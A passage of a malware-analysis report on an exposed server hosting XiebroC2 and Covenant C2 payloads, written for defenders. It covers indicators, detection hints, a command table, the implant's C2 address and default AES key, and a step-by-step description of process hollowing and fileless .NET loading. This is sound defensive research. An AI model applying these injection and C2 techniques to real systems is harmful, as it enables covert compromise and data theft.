---
title: "Open Directory at 193.56.255.154 — XiebroC2 v3.1 Go Implant and Covenant C2 Toolkit"
date: '2026-04-03'
layout: post
permalink: /reports/open-directory-193-56-255-154-xiebroc2/
hide: true
category: "C2 Framework"
description: "An open directory at 193.56.255.154 exposed a multi-framework C2 toolkit — XiebroC2 v3.1 Go implant and two Covenant stager builds — with infrastructure pivoting identifying a probable second operator server at 92.60.75.103 serving a novel undocumented beacon."
detection_page: /hunting-detections/open-directory-193-56-255-154-xiebroc2-detections/
ioc_feed: /ioc-feeds/opendirectory-193-56-255-154-20260403-iocs.json
detection_sections:
  - label: "YARA Rules"
    anchor: "#yara-rules"
  - label: "Sigma Rules"
    anchor: "#sigma-rules"
  - label: "Suricata Signatures"
    anchor: "#suricata-signatures"
ioc_highlights:
  - value: "193[.]56[.]255[.]154"
    note: "Primary C2 and staging server"
  - value: "92[.]60[.]75[.]103"
    note: "Secondary server — MODERATE same-operator"
  - value: "3aa45ceff7070ae6d183c5aa5f0d771a79c7cf37fe21a3906df976bee497bf20"
    note: "GruntHTTP.exe — Covenant stager Build 1"
  - value: "cff2d990f0988e9c90f77d0a62c72ca8e9bf567f0c143fdc3a914dce65edec98"
    note: "GruntHTTP.ps1 — PowerShell fileless loader"
---

**Campaign Identifier:** OpenDirectory-XiebroC2-Covenant-193.56.255.154
**Last Updated:** April 3, 2026

---

## Quick Reference

| Resource | Link |
|---|---|
| IOC Feed (machine-readable JSON) | [ioc-feeds/opendirectory-193-56-255-154-20260403-iocs.json](/ioc-feeds/opendirectory-193-56-255-154-20260403-iocs.json) |
| Detection Rules (YARA, Sigma, Suricata) | [hunting-detections/opendirectory-193-56-255-154-20260403-detections.md](/hunting-detections/opendirectory-193-56-255-154-20260403-detections.md) |
| Primary C2 Server | 193.56.255.154 (AS9009 / M247 Singapore) |
| Threat Level | HIGH |
| Families | XiebroC2 v3.1, Covenant C2 (2 stager builds) + PoC DLL (pivot IP 92.60.75.103) |

---

# 1. Executive Summary

An open directory at `193.56.255.154` was found exposing a multi-framework command-and-control (C2) toolkit — three distinct attack payloads and a proof-of-concept DLL, all hosted publicly on a VPS running Windows Server 2025 in Singapore. This report documents what was found on that infrastructure, why it represents a significant risk to any organization whose users encountered those files, and what detection and defensive measures are available. This investigation fills a gap in public reporting: no prior open-source analysis of this infrastructure or its payloads existed before this publication.

**What Was Found.** The staging server at `193.56.255.154` hosted three files accessible to anyone who browsed to it: `main.exe` (a Go-language remote access implant built from XiebroC2 v3.1), `GruntHTTP.exe` (a .NET C2 stager from the Covenant framework), and `GruntHTTP.ps1` (a PowerShell fileless loader delivering a second Covenant stager build). All three payloads connect back to `193.56.255.154` — confirming a single staging and command infrastructure. Infrastructure pivoting during the investigation identified a second open directory at `92.60.75.103` (MODERATE confidence same operator) hosting `s.d`, a non-operational proof-of-concept DLL whose developer artifacts link it to the same actor.

**Why This Matters.** XiebroC2 provides 36 confirmed post-exploitation commands including remote shell execution, fileless .NET assembly loading, process injection via two techniques (shellcode injection and process hollowing), screen capture, file exfiltration, and SOCKS5 network tunneling. The Covenant stagers deliver a full in-memory implant through an encrypted three-phase handshake. The use of two separate C2 frameworks from the same infrastructure — one raw TCP, one HTTP-mimicking — provides redundant access that evades single-vector blocking. This infrastructure represents a complete attack toolkit at the pre-deployment stage, with the open directory exposure meaning any party who scanned or browsed to the staging server could have retrieved the payloads.

**Threat Actor.** This activity is tracked at MODERATE confidence (72%) as operated by a previously untracked threat actor, designated UTA-2026-002 *(an internal tracking label used by The Hunters Ledger — see Section 6)*. No named threat group can be associated with this activity at any meaningful confidence level. The operator environment indicates Chinese-language system locale (GBK character encoding artifacts), but this alone does not establish national origin or state affiliation. The seven simultaneous operational security failures observed — including an exposed admin panel, default cryptographic keys, an embedded compile path, and unrestricted directory listing — are inconsistent with the profile of sophisticated nation-state actors.

**Key Risk Factors:**

<table class="professional-table">
  <thead>
    <tr>
      <th>Risk Dimension</th>
      <th class="numeric">Score</th>
      <th>Severity</th>
      <th>Key Driver</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Data Exfiltration</td>
      <td class="numeric high">8/10</td>
      <td class="high">HIGH</td>
      <td>36-command post-exploitation set including file streaming, screen capture, and SOCKS5 tunneling</td>
    </tr>
    <tr>
      <td>System Compromise</td>
      <td class="numeric critical">9/10</td>
      <td class="critical">CRITICAL</td>
      <td>Full remote shell, process injection, fileless .NET execution — complete control over victim host</td>
    </tr>
    <tr>
      <td>Persistence Difficulty <em>(higher score = harder for attacker to persist)</em></td>
      <td class="numeric medium">4/10</td>
      <td class="medium">MEDIUM</td>
      <td>No native persistence mechanism confirmed — XiebroC2 reconnects without registry/scheduled task artifacts</td>
    </tr>
    <tr>
      <td>Evasion Capability</td>
      <td class="numeric high">8/10</td>
      <td class="high">HIGH</td>
      <td>Jittered beaconing, dynamic API resolution, fileless loading, process injection, hidden windows</td>
    </tr>
    <tr>
      <td>Lateral Movement</td>
      <td class="numeric high">7/10</td>
      <td class="high">HIGH</td>
      <td>SOCKS5 reverse proxy tunnels operator traffic into internal network; shellcode injection enables process migration</td>
    </tr>
    <tr>
      <td>Detection Difficulty</td>
      <td class="numeric high">7/10</td>
      <td class="high">HIGH</td>
      <td>AES-ECB encrypted C2; no static IAT entries for injection APIs; fileless assembly loading</td>
    </tr>
    <tr>
      <td><strong>Overall Risk Score</strong></td>
      <td class="numeric critical"><strong>7.2/10</strong></td>
      <td class="critical"><strong>HIGH</strong></td>
      <td>Multi-framework redundant C2 with comprehensive post-exploitation capability</td>
    </tr>
  </tbody>
</table>

**For Technical Teams — Immediate Priorities:**
- Block `193.56.255.154` at perimeter across ports 80, 443, and 4444 — any existing connection to these ports represents a confirmed compromise or exposure event
- Hunt for the Covenant session token `75db-99b1-25fe4e9afbe58696-320bea73` in HTTP proxy logs — this string appears in every POST from either Covenant stager build, covering both delivery methods simultaneously (see [Section 9](#9-detection--hunting) and the [detection rules file](/hunting-detections/opendirectory-193-56-255-154-20260403-detections.md))
- Investigate any endpoint that made a TCP connection to port 4444 (XiebroC2 C2) or unencrypted HTTP to port 443 of this IP
- Query ETW `DotNETRuntime` AssemblyLoad events (Event ID 152) from non-.NET host processes — this catches both the Covenant stager payload delivery and XiebroC2 fileless .NET execution regardless of disk artifacts
- The hardcoded AES-128-ECB key `QWERt_CSDMAHUATW` enables offline decryption of any captured XiebroC2 C2 traffic from this campaign

---

# 2. Business Risk Assessment

## Understanding the Real-World Impact

The payloads found on this open directory represent a complete post-exploitation toolkit — tools an attacker uses after they have already gained initial access to a victim's machine. If any of these files were executed on an employee's workstation or a server inside your organization, the attacker operating the C2 server at `193.56.255.154` would have the ability to read files, watch the screen, run commands, steal credentials, and pivot to other internal systems — all through an encrypted channel that looks like ordinary internet traffic.

**Impact Scenarios:**

<table class="professional-table">
  <thead>
    <tr>
      <th>Scenario</th>
      <th>Likelihood</th>
      <th>Explanation</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Credential theft via in-memory tool execution</td>
      <td class="high">HIGH</td>
      <td>XiebroC2's <code>inline-assembly</code> command loads offensive .NET tools (such as credential harvesting tools) directly inside the implant process with no disk write. Standard antivirus scanning would not detect this activity.</td>
    </tr>
    <tr>
      <td>Internal network reconnaissance</td>
      <td class="high">HIGH</td>
      <td>The SOCKS5 reverse proxy command tunnels operator traffic through the victim into your internal network. The attacker can access internal resources — file shares, web applications, databases — as if they were physically on your network.</td>
    </tr>
    <tr>
      <td>Data exfiltration from compromised endpoint</td>
      <td class="high">HIGH</td>
      <td>The <code>downloadFile</code> command streams any file accessible to the executing user through the encrypted C2 channel. Screen capture via the <code>Screenshot</code> command provides visual access to any content displayed on the victim's monitor.</td>
    </tr>
    <tr>
      <td>Implant migration to trusted processes</td>
      <td class="medium">MEDIUM</td>
      <td>Two injection techniques (shellcode injection via CreateRemoteThread, and process hollowing) enable the operator to move the implant into a trusted Windows process such as explorer.exe or svchost.exe, making it significantly harder for security tools to identify and terminate.</td>
    </tr>
    <tr>
      <td>Lateral movement to additional hosts</td>
      <td class="medium">MEDIUM</td>
      <td>With credentials obtained via in-memory tooling and a SOCKS5 tunnel providing network access, an attacker can move laterally to additional hosts. No confirmed lateral movement was observed, but the capability is fully present in this toolkit.</td>
    </tr>
    <tr>
      <td>Persistent long-term access</td>
      <td class="medium">MEDIUM</td>
      <td>While XiebroC2 has no built-in persistence mechanism, an operator can use the <code>UploadFile</code> command to drop persistence artifacts, or use the <code>inline-assembly</code> capability to run persistence-establishing tools in memory. The dual C2 framework approach (XiebroC2 TCP + Covenant HTTP) provides redundant access if one channel is blocked.</td>
    </tr>
    <tr>
      <td>Payload staged for broader distribution</td>
      <td class="low">LOW</td>
      <td>The open directory meant these payloads were publicly accessible. There is a possibility that other actors retrieved copies of the same files for independent use, expanding the potential threat scope beyond a single operator.</td>
    </tr>
  </tbody>
</table>

Organizations with confirmed exposure to this infrastructure should consult their incident response playbook to prioritize containment, investigation, and monitoring activities using the detection indicators documented in Section 9 and Section 10.

---

# 3. What Was Found on This Infrastructure

## 3.1 Classification and Sample Inventory

The open directory at `193.56.255.154:80` (port 80, served by Python SimpleHTTP 0.6) exposed three files to any visitor. A fourth artifact, `s.d`, was recovered during infrastructure pivoting from a second open directory at `92.60.75.103` (assessed MODERATE confidence same operator — see Section 7):

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/open-directory-193-56-255-154-xiebroc2/open-directory-listing.png" | relative_url }}" alt="Attack Capture File Manager view of the open directory at 193.56.255.154, showing three payload files: GruntHTTP.exe (Covenant), GruntHTTP.ps1 (fileless loader), and main.exe (XiebroC2 implant)">
  <figcaption><em>Figure 1: The exposed open directory at 193.56.255.154 as captured during investigation — three distinct attack payloads publicly accessible to any visitor, served by Python SimpleHTTP on port 80.</em></figcaption>
</figure>

<table class="professional-table">
  <thead>
    <tr>
      <th>Filename</th>
      <th>Type</th>
      <th>Size</th>
      <th>Family</th>
      <th>Role</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>main.exe</code></td>
      <td>PE (Go x86)</td>
      <td>Large</td>
      <td class="critical">XiebroC2 v3.1</td>
      <td>Primary TCP C2 implant — 36-command post-exploitation kit</td>
    </tr>
    <tr>
      <td><code>GruntHTTP.exe</code></td>
      <td>PE32 .NET (x86)</td>
      <td>11,776 bytes</td>
      <td class="high">Covenant GruntStager (Build 1)</td>
      <td>HTTP C2 stager — PE executable delivery</td>
    </tr>
    <tr>
      <td><code>GruntHTTP.ps1</code></td>
      <td>PowerShell script</td>
      <td>7,541 bytes</td>
      <td class="high">Covenant GruntStager (Build 2)</td>
      <td>Fileless PowerShell loader — delivers embedded stager in memory</td>
    </tr>
    <tr>
      <td><code>s.d</code> <em>(from 92.60.75.103)</em></td>
      <td>PE64 DLL (x64)</td>
      <td>12,800 bytes</td>
      <td class="low">PoC DLL (non-operational)</td>
      <td>Development test artifact recovered from pivot IP 92.60.75.103 — not hosted on 193.56.255.154</td>
    </tr>
  </tbody>
</table>

**Family confidence:** DEFINITE — embedded source paths (`C:/Users/admin/Desktop/code/XiebroC2-3.1/`), Covenant namespace strings (`GruntStager`), and hardcoded configurations extracted directly from the binaries confirm both framework identities with no ambiguity.

## 3.2 File Identifiers

**main.exe (XiebroC2 v3.1):**

| Property | Value |
|---|---|
| Architecture | x86 32-bit (Go binary; runs via WOW64 on 64-bit Windows) |
| Compiler | Go toolchain (confirmed by pclntab symbol table) |
| Packer | None |
| SHA256 | Not captured in triage artifacts — see IOC feed data gap note |
| Compile path (embedded) | `C:/Users/admin/Desktop/code/XiebroC2-3.1/Implant/Implant/ImplantGo/cmd/tcp/windows/main.go:32` |
| Campaign tag (embedded) | `vps` |

**GruntHTTP.exe (Covenant Build 1):**

| Property | Value |
|---|---|
| MD5 | `7cfe0a039b61ec049b53e8e664036a6e` |
| SHA1 | `f0f4715a6d7063e7811502e9591f8265af0a2af6` |
| SHA256 | `3aa45ceff7070ae6d183c5aa5f0d771a79c7cf37fe21a3906df976bee497bf20` |
| Compiler | .NET CLR v2.0.50727 |
| Namespace | `GruntStager` |
| Entry method | `ExecuteStager()` |

**GruntHTTP.ps1 (PowerShell loader + embedded Build 2):**

| Property | Value |
|---|---|
| MD5 | `ac9b16b8bdf544db92f325a0901c5544` |
| SHA1 | `a79cd499c68482e73852db2c70d4e06251a29d95` |
| SHA256 | `cff2d990f0988e9c90f77d0a62c72ca8e9bf567f0c143fdc3a914dce65edec98` |
| Embedded payload SHA256 | `fc93712d44850bc730e1e4cf0f678a902e8f60a5d710b4bc19b0ab0b2fb79a95` |
| Encoding | Base64 + raw Deflate compression |

**s.d (PoC DLL):**

| Property | Value |
|---|---|
| MD5 | `2ac67005d80a76c77417086375e444d1` |
| SHA256 | `ed4d2a1f86b73e6a3f2d5378ba93a044f8c760307acfd3b99a0fa3c0b94fd107` |
| Compiler | Microsoft Visual C/C++ 19.36.35209 (Visual Studio 2022 v17.6) |
| Assessment | Non-operational test artifact; not a production threat |

Structured IOCs in machine-readable format: [ioc-feeds/opendirectory-193-56-255-154-20260403-iocs.json](/ioc-feeds/opendirectory-193-56-255-154-20260403-iocs.json)

---

# 4. Technical Capabilities — XiebroC2 v3.1 Deep-Dive

> **Analyst note:** This section explains how the main attack tool on this server works — from the moment it runs on a victim's computer to the full set of actions the attacker can remotely direct it to perform. XiebroC2 is a Chinese-developed, open-source remote access toolkit that gives an attacker complete control over a compromised Windows machine through an encrypted internet connection.

## 4.1 Family Identity — XiebroC2 v3.1

XiebroC2 (repository: `INotGreen/XiebroC2`) is a lightweight, cross-platform command-and-control framework developed by GitHub user INotGreen and positioned explicitly as a lower-resource-footprint alternative to commercial C2 platforms. The framework is Chinese in origin and written in Go, producing native Windows binaries as implants. Version 3.1, released in early 2024, introduced WebSocket transport, SOCKS5 reverse proxy, macOS client support, and screen capture capability.

**Evidence of this exact version:** The disassembler (Ghidra) recovered the following paths from the binary's pclntab (Go runtime symbol table) — a structure that preserves source file locations for every compiled function:

```
C:/Users/admin/Desktop/code/XiebroC2-3.1/Implant/Implant/ImplantGo/cmd/tcp/windows/main.go:32
C:/Users/admin/Desktop/code/XiebroC2-3.1/.../Socket/tcp/tcp_win.go
C:/Users/admin/Desktop/code/XiebroC2-3.1/.../HandlePacket/tcp/Packet_win.go
C:/Users/admin/Desktop/code/XiebroC2-3.1/.../Helper/handle/Assembly.go
C:/Users/admin/Desktop/code/XiebroC2-3.1/.../Helper/handle/RunPE.go
C:/Users/admin/Desktop/code/XiebroC2-3.1/.../Helper/loader/createremotethread.go
```

This is **DEFINITE** family identification — no ambiguity. The compile path additionally reveals the operator's username (`admin`) and staging approach (Desktop directory), consistent with compilation directly on the VPS or on a personal Windows workstation used as a build machine.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/open-directory-193-56-255-154-xiebroc2/xiebroc2-source-path-family-id.png" | relative_url }}" alt="Ghidra disassembler output showing the recovered Go source path XiebroC2-3.1/Implant embedded in the binary's pclntab symbol table, confirming family identification">
  <figcaption><em>Figure 2: The disassembler (Ghidra) recovering the XiebroC2 v3.1 source path from the binary's pclntab — the Go runtime symbol table that preserves compilation metadata. This is the definitive family identification evidence.</em></figcaption>
</figure>

**Source code typo as detection artifact:** The function name `main/Helper/sysinfo.WindosVersion` (missing the second 'w' in "Windows") is a typo preserved from the XiebroC2 3.1 source code. This string is unique to this version and is a static detection target that will match any XiebroC2 3.1 binary regardless of C2 address configuration.

## 4.2 Hardcoded C2 Configuration

> **Analyst note:** The implant's connection settings — including the server address and encryption key — are baked directly into the binary file. Analysts could read them out without running the malware.

The implant stores its configuration using a fixed-width space-padding technique. Strings are padded to constant widths and stripped at runtime:

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/open-directory-193-56-255-154-xiebroc2/xiebroc2-hardcoded-c2-config.png" | relative_url }}" alt="Decompiled binary showing hardcoded C2 address 193.56.255.154 and port 4444 stored as space-padded strings in the XiebroC2 implant">
  <figcaption><em>Figure 3: Decompiled view of the implant's configuration storage — C2 address 193.56.255.154 and port 4444 are hardcoded as space-padded strings directly in the binary, readable without execution.</em></figcaption>
</figure>

```
C2 IP:    "193.56.255.154                          "  →  "193.56.255.154"  (40-byte padded field)
C2 Port:  "4444                "                     →  "4444"             (20-byte padded field)
Tag:      "vps                       "               →  "vps"              (26-byte padded field)
```

The space-padding technique serves a dual purpose: it acts as a binary patch target (operators can change the C2 address at a known byte offset without recompiling), and the padded forms are distinctive YARA targets even after the implant has made network connections.

## 4.3 AES-128-ECB Encryption Key (CRITICAL)

> **Analyst note:** All traffic between this implant and the attacker's server is encrypted, but the encryption key is hardcoded inside the file. This means any saved network traffic from this implant can be decrypted — an unusual capability for defenders to have.

The 16-byte AES encryption key used for **all** C2 traffic — both commands sent to the victim and responses sent back — was recovered from the binary at address `DAT_00712b3a`:

| Format | Value |
|---|---|
| ASCII | `QWERt_CSDMAHUATW` |
| Hex bytes | `51 57 45 52 74 5F 43 53 44 4D 41 48 55 41 54 57` |
| Algorithm | AES-128-ECB (no IV) |
| Confidence | DEFINITE (static analysis) |

**Why this key is significant for defenders:** AES-ECB (Electronic Codebook mode) is cryptographically weak — identical plaintext produces identical ciphertext, and there is no initialization vector. More importantly, the keyboard-walk pattern of the key (`QWERt` from the top-left keyboard row) confirms this is the **XiebroC2 framework default** — the same key documented by AhnLab ASEC in their September 2025 analysis of XiebroC2 MS-SQL targeting campaigns [AhnLab ASEC, Tier 2: https://asec.ahnlab.com/en/90369/]. Any network capture of traffic to `193.56.255.154:4444` can be decrypted offline using this key.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/open-directory-193-56-255-154-xiebroc2/xiebroc2-aes-ecb-encrypt-call.png" | relative_url }}" alt="Decompiled code showing the call to main/Encrypt::aesECBncrypt confirming AES-ECB mode encryption is used for all C2 traffic">
  <figcaption><em>Figure 4: The AES encryption call in the C2 send path — confirming AES-ECB mode (no IV). The hardcoded key makes all captured traffic from this implant retroactively decryptable.</em></figcaption>
</figure>

**Decryption recipe for captured PCAP traffic:**
```
1. Read 4 bytes (little-endian uint32) → message length N
2. Read N bytes → AES-128-ECB ciphertext
3. Decrypt with key: QWERt_CSDMAHUATW
4. Unpack result as MessagePack → command string and payload fields
```

## 4.4 Wire Protocol and Beaconing

> **Analyst note:** The implant communicates with the attacker's server using a custom binary format over a raw internet connection. It randomizes the timing of its check-ins to avoid triggering alerts that look for regular-interval patterns.

XiebroC2 uses a binary protocol over plain TCP (port 4444):

```
[4-byte little-endian uint32: payload length] [N bytes: AES-128-ECB ciphertext]
```

After decryption, the payload is encoded in MessagePack format (a compact binary serialization format). The command string occupies the first field; subsequent fields carry command-specific parameters.

**Outbound responses** use identical framing. Large payloads (such as file downloads or screen captures) are chunked at 50 KB (51,200 bytes) per write. An 8-second heartbeat ticker sends periodic keepalive messages to maintain the C2 connection.

**Beacon jitter:** The connection watchdog (`Run_main()`) sleeps a randomly jittered interval of **0–4,999 milliseconds** between reconnection attempts, seeded from nanosecond-precision system time. This deliberate randomization prevents regular-interval network detection signatures.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/open-directory-193-56-255-154-xiebroc2/xiebroc2-messagepack-decode-switch.png" | relative_url }}" alt="Decompiled code showing the MessagePack decode switch statement that dispatches incoming operator commands to their respective handler functions">
  <figcaption><em>Figure 5: The MessagePack command dispatch switch — incoming C2 packets are AES-decrypted, unpacked, and routed to one of 36 handler functions based on the command string in the first field.</em></figcaption>
</figure>

## 4.5 Victim Registration Beacon

On every new connection, the implant sends a 15-field MessagePack registration packet to the C2 operator:

| Field | Data Collected |
|---|---|
| 0 | `"ClientInfo"` — packet type tag |
| 1 | Windows OS version (via `WindosVersion()`) |
| 2 | Hardware ID (persistent victim fingerprint) |
| 3 | `USERNAME` environment variable |
| 4 | Internal/LAN IP address |
| 5 | Computer name |
| 6 | Implant process ID |
| 7 | Campaign tag (`"vps"`) |
| 8 | OS category (`"10"` — Windows 10 build label) |
| 9–10 | Operator-assigned annotation tags |
| 11 | Admin privilege status (`IsAdmin()`) |
| 12 | Installed .NET CLR version |
| 13 | Group tag |
| 14 | Victim hostname |

**What this means operationally:** The operator receives a full host profile — OS version, username, internal IP, admin status, and .NET availability — on first connection. If admin status is false, the operator knows the implant needs privilege escalation before advanced techniques can be used. The `.NET CLR version` field tells the operator what .NET assemblies can be run via the `inline-assembly` command.

**GBK encoding artifact:** All shell output handlers call `ConvertGBKToUTF8()` before returning results to the C2. This is a runtime artifact of the operator's Windows system locale being configured for Chinese-language character sets (GBK = Windows code page 936, Simplified Chinese). This is a direct operator environment indicator.

## 4.6 Command Set — 36 Post-Exploitation Capabilities

The `HandlePacket/tcp.Read` function dispatches 36 confirmed commands. Commands are organized into functional categories:

**Remote Shell and Execution:**

| Command | Handler | Capability |
|---|---|---|
| `shell` | `os/exec.Command("cmd")` | Interactive cmd.exe with captured output |
| `OSshell` | `os/exec.Command("cmd /c")` | Non-interactive cmd.exe execution |
| `OSpowershell` | `os/exec.Command("powershell")` | PowerShell execution |
| `RunPS` | `Helper/handle.Assembly` | PowerShell via .NET injection |
| `execute` | `os/exec.Command.Start` | Fire-and-forget process launch |
| `spawnBin` | `Helper/handle.RunCreateProcessWithPipe` | Spawn process with I/O pipe (see Section 4.8) |
| `shellWriteInput` | `os/exec.Command("cmd /c cd&&...")` | Shell with persistent working directory |

*All shell execution commands set `HideWindow = true` (`CREATE_NO_WINDOW` flag) — no console window visible to the victim.*

**In-Memory Execution (Fileless):**

| Command | Handler | Capability |
|---|---|---|
| `inline-assembly` | `Helper/handle.InlineAssembly` | In-process .NET CLR hosting (see Section 4.7) |
| `execute-assembly` | `Helper/handle.Assembly` | .NET assembly execution router |
| `inline-bin` | `Helper/handle.Inline_Bin` | Reflective binary execution |

**Process Injection:**

| Command | Handler | Capability |
|---|---|---|
| `Migration` | `Helper/loader.RunCreateRemoteThread` | Shellcode injection via CreateRemoteThread |
| `spawnBin` | `Helper/handle.RunCreateProcessWithPipe` | Process hollowing into sacrifice process |

**File System Operations:**

| Command | Handler | Capability |
|---|---|---|
| `FileRead` | `Helper/handle.FileRead` | Stream file contents to C2 |
| `downloadFile` | `os.ReadFile` + TcpSend | Exfiltrate file to C2 operator |
| `UploadFile` | `os.WriteFile` | Drop file from C2 to victim disk |
| `deleteFile` | `Helper/handle.DeleteFile` | Delete file |
| `renameFile` | `os.rename` | Rename file |
| `cutFile` | `Helper/handle.CutFile` | Move file |
| `pasteFile` | `Helper/handle.CopyFile` | Copy file |
| `NewFile` | `Helper/handle.ListDir` | Directory listing |
| `NewFolder` | `os.MkdirAll` | Create directory |
| `ZIP` | `Helper/handle.Zip` | Compress file or directory |
| `UNZIP` | `Helper/handle.Unzip` | Decompress archive |

**Reconnaissance and Discovery:**

| Command | Handler | Capability |
|---|---|---|
| `process` | `Helper/handle.ProcessInfo` | Full running process list |
| `CheckAV` | `gopsutil.ProcessesWithContext` | Process enumeration (security tool detection) |
| `NetWork` | `Helper/handle.Network` | Network interface enumeration |
| `getDrivers` | `Helper/handle.GetDrivers` | Disk and volume enumeration |
| `Screenshot` | `Helper/handle.Screenshot` | Screen capture → PNG sent to C2 |
| `getPath` | `syscall.Getwd` | Get or set working directory |
| `GetCurrentPath` | `Helper/handle.GetCurrentPath` | Send current working directory |

**Network and Lateral Movement:**

| Command | Handler | Capability |
|---|---|---|
| `ReverseProxy` | `Helper/proxy.ReverseSocksAgent` | SOCKS5 reverse proxy tunnel |
| `processKill` | `Helper/handle.KillProcess` | Kill process by PID |

**Operator/Implant Management:**

| Command | Handler | Capability |
|---|---|---|
| `Group` | config write | Update operator group assignment |
| `NoteAdd` | config write | Write operator annotation to implant config |
| `ClientReboot` | `os.Exit(0)` + re-launch | Restart implant process |
| `ClientUnstaller` | `os.Remove` + `os.Exit` | Self-delete binary and exit |
| `option` (Disconnect) | `taskkill /PID` | Self-terminate |

## 4.7 Fileless .NET Execution via In-Process CLR Hosting

> **Analyst note:** This capability lets the attacker run any .NET hacking tool — for example, a password harvester or Active Directory scanner — entirely inside the main.exe process, with nothing written to the hard drive and no visible new program window. Standard antivirus cannot detect this because it only scans files.

The `inline-assembly` command invokes `main/Helper/handle.InlineAssembly`, which uses the vendored offensive library `github.com/Ne0nd0g/go-clr` to host the Windows Common Language Runtime (CLR) — the .NET execution engine — directly inside the `main.exe` process:

```c
// Source: Assembly.go:983 — main.exe @ 193.56.255.154
github.com/Ne0nd0g/go-clr::go-clr.RedirectStdoutStderr(); // capture assembly output
github.com/Ne0nd0g/go-clr::go-clr.LoadCLR("v4", 2);      // host CLR v4 in main.exe
github.com/Ne0nd0g/go-clr::go-clr.LoadAssembly(...);      // load operator .NET assembly
github.com/Ne0nd0g/go-clr::go-clr.InvokeAssembly(...);    // execute, return stdout to C2
```

**Operational significance:** The operator can deliver any .NET Framework 4.x assembly as post-exploitation tooling — credential harvesters, Active Directory enumeration tools, privilege escalation utilities. The assembly runs entirely inside `main.exe`: no child process is spawned, no file is written to disk, no console window appears. The assembly's output is captured and returned to the C2 dashboard as a text block.

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/open-directory-193-56-255-154-xiebroc2/xiebroc2-go-clr-inline-assembly.png" | relative_url }}" alt="Decompiled code showing the github.com/Ne0nd0g/go-clr library call chain used to host the .NET CLR in-process and execute operator-supplied assemblies without writing to disk">
  <figcaption><em>Figure 6: The go-clr library call that hosts the .NET runtime directly inside main.exe — enabling fileless execution of any .NET tool the operator delivers, with output piped back to the C2 dashboard.</em></figcaption>
</figure>

**Detection constraint:** `main.exe` has no `mscoree.dll` import in its static import table. A legitimate Go binary never loads the CLR at runtime. If security monitoring observes `main.exe` loading `mscoree.dll` or `clr.dll` (Sysmon Event ID 7 — Image Load), this is definitively anomalous.

**ETW detection path:** The `Microsoft-Windows-DotNETRuntime` ETW provider fires `AssemblyLoad` events (Event ID 152) for every assembly loaded, including in-process CLR-hosted assemblies. These events fire regardless of disk artifacts, making them the primary detection surface for fileless .NET execution.

The full import path `github.com/Ne0nd0g/go-clr` is embedded in any Go binary that uses this library via the pclntab symbol table, providing a static YARA detection target.

## 4.8 Process Hollowing — Entry Point Patching

> **Analyst note:** This technique lets the implant hide inside a legitimate Windows program. The attacker's code starts a normal Windows application (such as notepad.exe), pauses it before it runs, secretly replaces its program code with malicious code, then lets it start. From the outside, it looks like a legitimate program is running.

`RunCreateProcessWithPipe` (source: `RunPE.go:34`) implements process hollowing via entry point patching. All injection APIs are resolved dynamically at runtime — they do not appear in the binary's static import table, bypassing import-based detection:

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/open-directory-193-56-255-154-xiebroc2/runpe-mz-header-validation.png" | relative_url }}" alt="Decompiled code showing the MZ header validation check in RunPE — verifying the magic bytes 0x5a4d before proceeding with process hollowing injection">
  <figcaption><em>Figure 7: The RunPE MZ header check — the implant validates the target PE file's magic bytes (0x5A4D = "MZ") before attempting hollowing, with a descriptive error string that also functions as a YARA detection anchor.</em></figcaption>
</figure>

```
Step 1: Dynamic API resolution via LazyProc (no static IAT entries):
         VirtualAllocEx, VirtualProtectEx, WriteProcessMemory,
         NtQueryInformationProcess, ReadProcessMemory

Step 2: Three pipe pairs (stdin/stdout/stderr) created → STARTUPINFO populated

Step 3: CreateProcess(target, CREATE_SUSPENDED=0x4) → process paused before execution

Step 4: VirtualAllocEx(hProcess, PAGE_READWRITE) → WriteProcessMemory(payload)
         → VirtualProtectEx(PAGE_EXECUTE_READ)  [RW → RX, never RWX]

Step 5: PE header parsing via ReadProcessMemory:
         NtQueryInformationProcess → PEB.ImageBaseAddress
         DOS header check (0x5a4d / "MZ") → PE signature check (0x4550 / "PE")
         IMAGE_FILE_HEADER.Machine → x64 (0x8664) or x86 (0x14c) branch

Step 6: Architecture-aware jump shellcode written at entry point:
         x64: 48 b8 [8-byte addr] ff e0  (mov rax, addr; jmp rax — 12 bytes)
         x86: b8 [4-byte addr] ff e0     (mov eax, addr; jmp eax — 7 bytes)

Step 7: ResumeThread → victim entry point → JMP → injected PE

Step 8: Real-time output streaming:
         goroutine 1: stdout pipe → channel
         goroutine 2: channel → TcpSend → C2 operator
         WaitForSingleObject(INFINITE) → wait for process exit
```

<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/open-directory-193-56-255-154-xiebroc2/runpe-createprocess-suspended.png" | relative_url }}" alt="Decompiled code showing CreateProcess called with flag 0x4 (CREATE_SUSPENDED), pausing the target process before its code is replaced">
  <figcaption><em>Figure 8: CreateProcess called with flag 0x4 (CREATE_SUSPENDED) — the target process is spawned but frozen before it executes, giving the implant time to overwrite its code with the payload before resuming it.</em></figcaption>
</figure>

**EDR evasion:** The `PAGE_READWRITE → PAGE_EXECUTE_READ` permission sequence (never `PAGE_EXECUTE_READWRITE`) avoids RWX allocations, which many security tools flag explicitly. The `CREATE_SUSPENDED` + `NtQueryInformationProcess` + `ReadProcessMemory` API sequence is a reliable behavioral detection signature.

**Unique error strings (YARA targets):**
```
"DOS image header magic string was not MZ"
"PE Signature string was not PE"
"NtQueryInformationProcess returned NTSTATUS: %x(%d)"
"Unknown IMAGE_OPTIONAL_HEADER type for machine type: 0x%x"
```

These strings are unique to the XiebroC2 PE parser implementation and provide high-confidence YARA detection targets.

## 4.9 CreateRemoteThread Shellcode Injection

> **Analyst note:** This is an alternative method for hiding inside another process. Instead of replacing a process's code entirely, the attacker's code is injected as a separate thread running inside a chosen target process — making it appear to belong to that process.

`RunCreateRemoteThread` (source: `createremotethread.go:12`) implements the `Migration` command:

```c
// Source: createremotethread.go:12 — main.exe @ 193.56.255.154
